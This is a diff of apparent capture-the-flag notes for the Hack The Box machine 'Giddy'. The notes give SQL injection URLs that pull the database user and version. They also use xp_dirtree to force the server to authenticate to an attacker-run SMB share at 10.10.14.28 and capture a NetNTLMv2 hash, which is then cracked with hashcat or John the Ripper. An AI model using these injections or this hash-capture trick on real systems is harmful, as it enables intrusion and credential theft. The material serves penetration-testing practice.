@@ -9,16 +9,19 @@ http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=18%20union%20select%201,2
 http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=18 union select system_user,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version,@@version--
 
 ==============================================================================
-[+] MSSQL Get Credentials
+[+] MSSQL Get Credentials and Cracking the NetNTLMv2 Hash
 ==============================================================================
 # Create a simple SMB service in Linux
 sudo impacket-smbserver Temporal $(pwd) -smb2support
 
-# Execute  master.sys.xp_dirtree
+# Execute funtion master.sys.xp_dirtree
 http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=18; EXEC master.sys.xp_dirtree '\\10.10.14.28\Temporal',0,1;
 
-# Create a hash.txt with hash inside and crack with hashcat
+# Create a hash.txt with hash inside and crack with Hashcat
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+# Or Crack with John the Ripper
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 ==============================================================================
 [+] MSSQL Get Reverse Shell
